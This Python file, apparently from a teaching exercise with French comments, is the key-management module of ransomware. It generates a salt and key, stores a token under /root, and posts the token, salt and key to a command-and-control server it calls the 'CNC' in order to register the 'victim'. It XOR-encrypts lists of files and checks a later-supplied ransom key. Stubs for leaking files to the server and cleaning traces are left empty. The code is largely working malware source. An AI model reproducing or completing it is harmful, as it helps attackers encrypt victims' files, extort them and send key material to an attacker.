from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=self.KEY_LENGTH,salt=salt,iterations=self.ITERATION)
        derived_key = kdf.derive(key)
        return derived_key # Renvoie la clé dérivée à partir du sel et de la clé initilale

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH) 
        token = self.do_derivation(salt, key) 
        return salt, key, token # Renvoie un sel et une clé aléatoire ainsi qu'un token associé
    
    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        url = f"http://{self._remote_host_port}/new"
        data = {"token" : self.bin_to_b64(token),"salt" : self.bin_to_b64(salt),"key" : self.bin_to_b64(key)}
        response = requests.post(url, json=data) 
        if response.status_code != 200:
            self._log.error(f"Echec de l'envoi des données : {response.text}")
        else:
            self._log.info("Confirmation de l'envoi des données")
        # Envoie les données cryptographique au fichier cnc

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("Les données de chiffrement sont déjà initialisées")

        self._salt, self._key, self._token = self.create()
        os.makedirs(self._path, exist_ok=True)

        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_f:
            salt_f.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_f:
            token_f.write(self._token)

        self.post_new(self._salt, self._key, self._token)
        # Crée, sauvegarde dans un fichier et envoie au cnc les données de chiffrement après s'être assuré que celles-ci n'existent pas déjà

    def load(self)->None:
        # function to load crypto data
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Les données de chiffrement n'ont pas été trouvées")
        #Charge les éléments de chiffrement renseignés après s'être assuré que ceux-ci existent

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token
        # Renvoie un token défini à partir de la clé renseignée 

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        test_key = base64.b64decode(b64_key)
        if self.check_key(test_key):
            self._key = test_key
            self._log.info("La clé renseignée est valide")
        else:
            raise ValueError("La clé renseignée est invalide")
        # Définit la clé de chiffrement en tant que clé renseignée après avoir testé la validité de celle-ci

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        hex_token = sha256(self._token).hexdigest()
        return hex_token
        # Renvoie le token converti en hexadécimal

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f_path in files:
            try:
                xorfile(f_path, self._key)
                self._log.info(f"Le fichier {f_path} a été chiffré avec succès")
            except Exception as error:
                self._log.error(f"Echec du chiffrement du fichier {f_path}: {error}")
        # Chiffre les fichiers entrés à partir de la clé de chiffrement



    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()